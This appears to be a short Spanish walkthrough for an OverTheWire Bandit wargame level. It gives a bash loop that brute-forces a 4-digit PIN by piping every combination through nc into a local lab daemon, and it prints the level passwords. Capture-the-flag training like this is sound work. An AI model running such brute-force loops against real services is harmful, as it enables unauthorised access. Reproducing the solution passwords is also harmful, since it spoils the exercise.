A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
> You do not need to create new connections each time
## Comandos
```
cd /var/spool/bandit24/foo
touch hola.sh
nano hola.sh

#copiar esto dentro del archivo
#!/bin/bash

password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

for pin in $(seq -w 0000 9999); do
    echo "$password $pin"
done | nc localhost 30002

#comandos para salir de la consola
control O
control X

chmod +x hola.sh
./hola.sh
```

## Contraseña    
- iCi86ttT4KSNe1armKiwbQNmB3YJP3q4